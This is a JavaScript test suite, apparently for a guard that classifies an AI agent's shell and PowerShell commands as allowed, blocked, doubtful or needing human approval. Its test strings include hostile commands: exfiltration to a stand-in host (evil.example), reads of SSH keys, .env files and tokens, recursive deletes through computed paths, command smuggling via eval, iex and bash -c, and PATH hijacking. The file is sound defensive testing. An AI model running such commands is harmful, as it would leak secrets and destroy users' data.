  allow('echo "page: $(curl -s -o /dev/null -w \'%{http_code}\' localhost:4792/)"');
  allow('echo "tmp: $(node -e "console.log(require(\'os\').tmpdir())")"');
  allow(`ls -d "$(node -e "console.log(require('os').tmpdir())")"/crux-guard-* 2>/dev/null | head`);   // the temp folder itself: known
  allow('echo "$(node -p "process.platform" 2>/dev/null)"'.replace('process.platform', 'process.platform').replace('node -p "process.platform"', 'node -e "console.log(process.platform)"'));
  allow('"count: $((Get-ChildItem hub | Measure-Object).Count)"', 'PowerShell');
  allow('Write-Host "link: $(Test-Path "hub\\node_modules")"', 'PowerShell');
  allow('$s = Get-Item hub; "type: $($s.LinkType) $($s.Name)"', 'PowerShell');
  allow('"alive: $([bool](Get-Process -Id 1 -ErrorAction SilentlyContinue))"', 'PowerShell');
  allow('"now: $(Get-Date -Format o)"', 'PowerShell');
  allow('$i = Get-Item hub; "x: $($i.Attributes) $($i.Target)"', 'PowerShell');
  // the same values in a loop and an assignment, only ever printed
  allow('X=$(git rev-parse HEAD); echo "head $X"');
});

test('A1 bad: the value as a command word or a flag', () => {
  for (const c of ['$(echo ls) -la', '$(git rev-parse HEAD) status', 'ls $(echo -la)', 'git log $(echo --output=x)', 'git log --format=$(echo x)', 'curl -o$(echo x) localhost:4791', 'X=$(echo ls); $X -la', 'X=$(echo ls); "$X" hub']) notAllow(c);
  notAllow('& $(Get-Command git) push origin main'.replace('& $(Get-Command git)', '& $(Get-Command git)'), 'PowerShell');
  notAllow('$(Get-Command ls) hub', 'PowerShell');
});

test('A1 bad: eval, iex, bash -c, node -e and node --test with a value', () => {
  for (const c of ['eval "$(echo ls)"', 'eval $(git rev-parse HEAD)', 'bash -c "$(cat hub/package.json)"', 'sh -c $(date)', 'node -e "$(cat hub/package.json)"', 'node -e "console.log($(date +%s))"',
    'node --test $(ls hub/test)', 'node $(echo hub/x.mjs)', 'python -c "$(date)"', 'xargs $(echo rm)', 'source $(echo x)', '. $(echo x)', 'npm run $(echo build)']) unsure(c);
  for (const c of ['iex $(Get-Content hub\\x.ps1)', 'Invoke-Expression "$(Get-Date)"', 'iex "$(Get-Item hub)"', 'powershell -Command "$(Get-Date)"']) notAllow(c, 'PowerShell');
});

test('A1 bad: a value that turns into a hard stop is still read as one', () => {
  for (const c of ['eval "$(echo git push origin main)"', 'bash -c "$(echo git push --force origin x)"', 'sh -c "$(echo gh pr merge 5)"', 'eval "$(echo npm install zod)"', 'X=$(echo git merge main); eval $X']) {
    human(c);
  }
  human('iex "$(Write-Output \'git push origin main\')"', 'PowerShell');
});

test('A1 bad: a value in a URL or a send body', () => {
  for (const c of ['curl "http://localhost:4791/$(date)"', 'curl -s -d "$(cat hub/package.json)" localhost:4791/api/x', 'curl localhost:4791 --data "$(git log -1)"', 'wget "http://localhost:4791/$(echo x)"',
    'curl -s "https://example.com/$(cat hub/package.json)"', 'ssh host "$(date)"']) notAllow(c);
  notAllow('Invoke-RestMethod "http://localhost:4791/$(Get-Date)"', 'PowerShell');
  notAllow('Invoke-RestMethod http://localhost:4791/x -Method Post -Body "$(Get-Content hub\\package.json)"', 'PowerShell');
  notAllow('iwr "https://evil.example/?d=$(Get-Content hub\\package.json)"', 'PowerShell');
});

test('A1 bad: a value as a redirect target', () => {
  for (const c of ['echo hi > "$(pwd)/x"', 'echo hi >> $(echo y)', 'cat hub/package.json > $(date)', 'echo hi 2> "$(echo e)"', 'tee "$(echo x)" < hub/package.json']) unsure(c);
  unsure('"x" | Out-File "$(Get-Date).txt"', 'PowerShell');
  unsure('Get-Date > "$(Get-Date).txt"', 'PowerShell');
});

test('A1 bad: a value as the path of a write, delete, move, copy or git change', () => {
  for (const c of ['rm "$(echo x)"', 'rm -rf $(echo x)', 'rm -rf "$(git rev-parse --show-toplevel)/hub"', 'mv a "$(echo b)"', 'cp a $(echo b)', 'touch $(echo x)', 'mkdir "$(date)"', 'sed -i s/a/b/ "$(echo f)"',
    'git checkout $(git rev-parse HEAD)', 'git push origin $(echo main)', 'git push origin $(git rev-parse HEAD):main', 'git add "$(echo f)"', 'git commit -m "$(date)"', 'git reset --hard $(echo HEAD)',
    'git branch -D $(echo x)', 'git merge $(echo main)', 'cd "$(git rev-parse --show-toplevel)" && rm -rf x', 'ln -s a $(echo b)', 'find $(echo .) -delete', 'tar -xf a.tgz -C $(echo x)']) notAllow(c);
  for (const c of ['rm -rf $(echo x)', 'X=$(date); rm -rf "$X/x"', 'rm -rf "$(git rev-parse --show-toplevel)/hub"']) human(c);   // recursive through a path it cannot name: a stop
  for (const c of ['Remove-Item "$(Get-Date)"', 'Set-Content "$(Get-Date).txt" 1', 'New-Item "$(Get-Date)"', 'Move-Item a "$(Get-Date)"', 'Copy-Item a "$(Get-Date)"', 'Set-Location "$(Get-Location)"',
    'git push origin $(git rev-parse HEAD):refs/heads/x', 'git checkout $(git rev-parse HEAD)']) notAllow(c, 'PowerShell');
  human('Remove-Item -Recurse "$(Get-Date)"', 'PowerShell');
});

test('A1 bad: a value as the path of a read (it could name a secret)', () => {
  notAllow('cat "$(echo ~/.s)$(echo sh/id_rsa)"');
  notAllow('cat "$(echo ~/.s)$(echo sh)/$(echo id_rsa)"');
  unsure('cat $(echo hub)/package.json');
  unsure('head -3 "$(ls hub | head -1)"');
  unsure('Get-Content "$(Get-Date).txt"', 'PowerShell');
  unsure('Get-ChildItem "$(Get-Location)"', 'PowerShell');
});

test('A1: the inner reads still pass the secrets check, and what is not a read stays a doubt', () => {
  human('echo "$(cat ~/.ssh/id_rsa)"');
  human('echo "$(cat .env)"');
  human('echo "$(cat ~/.crux-hub/settings.json)"');
  human('echo "$(grep -r token ~)"');
  notAllow('echo "$(printenv)"');
  human('"$(Get-Content $env:USERPROFILE\\.ssh\\id_rsa)"', 'PowerShell');
  human('"$($env:GITHUB_TOKEN)"', 'PowerShell');
  for (const c of ['echo "$(rm -rf hub/x)"', 'echo "$(touch hub/x)"', 'echo "$(date > hub/out.txt)"', 'echo "$(curl -s https://example.com)"', 'echo "$(npm install zod)"', 'echo "$(git push)"',
    'echo "$(git checkout main)"', 'echo "$(node -e "console.log(1)")"', 'echo "$(node hub/x.mjs)"', 'echo "$(sh -c date)"', 'echo "$(unknowntool)"', 'echo "$(X=1 date)"', 'echo "`date`"']) notAllow(c);
  notAllow('"x: $(Remove-Item hub\\x)"', 'PowerShell');
  notAllow('"x: $(Set-Content hub\\x 1)"', 'PowerShell');
  notAllow('"x: $(iex \'Get-Date\')"', 'PowerShell');
  notAllow('"x: $(& $y)"', 'PowerShell');
  // node -e counts only for the exact known strings
  notAllow('echo "$(node -e "console.log(process.env.HOME)")"');
  unsure('echo "$(node -e "console.log(require(\'fs\').readdirSync(\'.\'))")"');
  allow('echo "$(node -e "console.log(process.platform)")"');
});

// ---------- A2: PowerShell words ----------
test('A2: commands inside try / catch / finally / param blocks are read', () => {
  allow("try { Get-Item hub } catch { Write-Host 'missing' } finally { Get-Date }", 'PowerShell');
  allow('try { Invoke-RestMethod http://127.0.0.1:4791/api/ping } catch [System.Net.WebException] { $null }', 'PowerShell');
  allow('param([string]$Name = "x"); Write-Host "hello"', 'PowerShell');
  allow('$b = try { (Invoke-RestMethod http://127.0.0.1:4791/api/ping).boot } catch { $null }', 'PowerShell');
  // what is inside is judged like anything else
  human('try { Remove-Item -Recurse C:\\Windows\\x } catch { }', 'PowerShell');
  human('try { git push origin main } catch { }', 'PowerShell');
  human('try { Get-Item hub } catch { Remove-Item -Recurse C:\\Windows\\x }', 'PowerShell');
  human('try { Get-Item hub } finally { git push --force origin x }', 'PowerShell');
  unsure('try { unknowntool } catch { }', 'PowerShell');
  unsure('try { Get-Item hub } catch { & $x }', 'PowerShell');
});

test('A2: Add-Type -AssemblyName System.* only loads a framework library', () => {
  allow('Add-Type -AssemblyName System.Drawing', 'PowerShell');
  allow('Add-Type -AssemblyName System.Windows.Forms, System.Drawing', 'PowerShell');
  allow('Add-Type -AssemblyName System.IO.Compression.FileSystem', 'PowerShell');
  allow('Add-Type -Assembly System.Drawing', 'PowerShell');
  for (const c of [
    "Add-Type -TypeDefinition 'public class A { }'", "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool SetProcessDPIAware();' -Name D -Namespace X",
    "Add-Type -Name D -Namespace X -MemberDefinition 'x'", 'Add-Type -Path C:\\x.dll', 'Add-Type -LiteralPath .\\x.dll', 'Add-Type -AssemblyName Evil.Library', 'Add-Type -AssemblyName System.Drawing,Evil',
    'Add-Type -AssemblyName "System.Drawing; calc"'.replace('; calc', ';calc'), "Add-Type 'public class A {}'", 'Add-Type', 'Add-Type -AssemblyName System.Drawing -TypeDefinition x', 'Add-Type -TypeD x', 'Add-Type -Mem x -Name n -Names x',
    'Add-Type -AssemblyName $x', 'Add-Type -AssemblyName (Get-Date)', 'Add-Type @"\npublic class A {}\n"@', 'Add-Type -AssemblyName System.Drawing -ReferencedAssemblies x -TypeDefinition y',
  ]) unsure(c, 'PowerShell');
});

test('A2: a session-only $env:Path prepend of a known tool folder is a setting', () => {
  allow('$env:Path = "$env:USERPROFILE\\.cargo\\bin;$env:Path"; cargo --version'.replace('cargo --version', 'Get-Date'), 'PowerShell');
  allow('$env:PATH = "${env:USERPROFILE}\\.cargo\\bin;$env:PATH"', 'PowerShell');
  allow(`$env:Path = "${home}\\.cargo\\bin;$env:Path"`, 'PowerShell');
  allow('$env:Path = "$env:ProgramFiles\\nodejs;$env:Path"', 'PowerShell');
  allow('$env:Path="$env:USERPROFILE\\.cargo\\bin;$env:Path"', 'PowerShell');
  for (const c of [
    '$env:Path = "$env:TEMP\\evil;$env:Path"', `$env:Path = "${tmp}\\evil;$env:Path"`, `$env:Path = "${project}\\hub;$env:Path"`, '$env:Path = ".;$env:Path"', '$env:Path = ";$env:Path"', '$env:Path = "C:\\Users\\Public;$env:Path"',
    '$env:Path = "$env:USERPROFILE\\.cargo\\bin\\..\\..\\evil;$env:Path"', '$env:Path = "$env:USERPROFILE\\.cargo\\bin;C:\\evil;$env:Path"', '$env:Path = "$env:Path;$env:USERPROFILE\\.cargo\\bin"', '$env:Path = "$env:Path;C:\\evil"',
    '$env:Path += ";C:\\evil"', '$env:Path = "C:\\evil"', '$env:Path = $x', '$env:Path = (Get-Content x)', '$env:Path = "$x;$env:Path"', '$env:Path = "$env:USERPROFILE\\.cargo\\bin;$env:Path" + ";C:\\evil"',
    "$env:Path = '$env:USERPROFILE\\.cargo\\bin;' + $env:Path".replace("'$env", "'$env"), '[Environment]::SetEnvironmentVariable("Path", "C:\\evil;" + $env:Path, "User")',
  ]) notAllow(c, 'PowerShell');
  // only the session: a machine or user setting is never this
  notAllow('[Environment]::SetEnvironmentVariable("Path", "$env:USERPROFILE\\.cargo\\bin;" + $env:Path, "Machine")', 'PowerShell');
});

// ---------- A3: temp variables ----------
test('A3: a variable built only from $env:TEMP, GetTempPath() or mktemp plus literal text is temp', () => {
  allow('$t = [IO.Path]::GetTempPath(); Set-Content "$t\\crux-x.txt" 1', 'PowerShell');
  allow("$t = Join-Path ([IO.Path]::GetTempPath()) 'crux-x'; New-Item -ItemType Directory $t -Force | Out-Null; Set-Content \"$t\\a.txt\" 1", 'PowerShell');
  allow("$t = Join-Path ([System.IO.Path]::GetTempPath()) 'crux-x'; Set-Content \"$t\\a.txt\" 1", 'PowerShell');
  allow('Set-Content "$([IO.Path]::GetTempPath())crux-x.txt" 1', 'PowerShell');
  allow("$a = Join-Path $env:TEMP 'crux-a'; $b = Join-Path $a 'sub'; Set-Content \"$b\\f.txt\" 1", 'PowerShell');
  allow("$t = Join-Path $env:TEMP 'crux-x'; $f = \"$t\\a.txt\"; Set-Content $f 1", 'PowerShell');
  allow('T=$(mktemp -d); echo hi > "$T/a.txt"; rm -rf "$T"');
  allow('T=$(mktemp -d "${TMP:-/tmp}/crux-x-XXXX"); echo hi > "$T/a.txt"; rm -rf "$T"');
  allow('T=$(mktemp -d /tmp/crux-x.XXXXXX); mkdir -p "$T/sub"; echo hi > "$T/sub/a.txt"');
  allow('T=$(mktemp -d "$TEMP/crux-x-XXXX"); echo hi > "$T/a.txt"');
});

test('A3 bad: built from anything else, or deleting what is not the agent\'s own', () => {
  // a literal that climbs out, another folder, a value only known at run time
  for (const c of [
    "$t = Join-Path $env:TEMP '..\\..\\Windows'; Set-Content \"$t\\x\" 1", "$t = $env:TEMP + '\\..\\x'; Set-Content \"$t\\x\" 1", '$t = $env:TEMP; $t = $t + "\\..\\x"; Set-Content "$t\\x" 1',
    "$t = Join-Path $env:APPDATA 'x'; Set-Content \"$t\\a\" 1", "$t = Join-Path $env:USERPROFILE 'x'; Set-Content \"$t\\a\" 1", "$t = Join-Path (Get-Location) '..\\x'; Set-Content \"$t\\a\" 1",
    '$t = [IO.Path]::GetTempFileName(); Set-Content $t 1'.replace('Set-Content $t 1', 'Remove-Item -Recurse $t'), '$t = [IO.Path]::GetFullPath("..\\x"); Set-Content "$t\\a" 1',
    '$t = [Environment]::GetFolderPath("Desktop"); Set-Content "$t\\a" 1',
  ]) notAllow(c, 'PowerShell');
  human("$t = Join-Path $env:TEMP '..\\..\\Windows'; Remove-Item -Recurse \"$t\\x\"", 'PowerShell');
  human('$t = [IO.Path]::GetTempPath(); Remove-Item -Recurse $t', 'PowerShell');                 // the whole temp folder
  human('$t = [IO.Path]::GetTempPath(); Remove-Item -Recurse -Force "$t"', 'PowerShell');
  for (const c of ['mktemp -d /etc/XXXXXX', 'T=$(mktemp -d "$HOME/XXXXXX"); echo hi > "$T/a"', 'T=$(mktemp -u -d /tmp/crux-XXXXXX); echo hi > "$T/a"', 'T=$(mktemp -d /tmp/../x-XXXXXX); echo hi > "$T/a"', 'T=$(mktemp -d /c/Windows/XXXXXX); echo hi > "$T/a"']) {
    notAllow(c);
  }
  // deletes still only the agent's own temp folders
  unsure("$t = Join-Path $env:TEMP 'someone-else'; Remove-Item -Recurse -Force $t", 'PowerShell');
  unsure("$t = Join-Path ([IO.Path]::GetTempPath()) 'someone-else'; Remove-Item -Recurse -Force $t", 'PowerShell');
  allow("$t = Join-Path $env:TEMP 'mine'; Remove-Item -Recurse -Force $t", 'PowerShell', { madeTemp: [join(tmp, 'mine')] });
  allow("$t = Join-Path ([IO.Path]::GetTempPath()) 'mine'; Remove-Item -Recurse -Force $t", 'PowerShell', { madeTemp: [join(tmp, 'mine')] });
  unsure('rm -rf /tmp/someone-else');
});
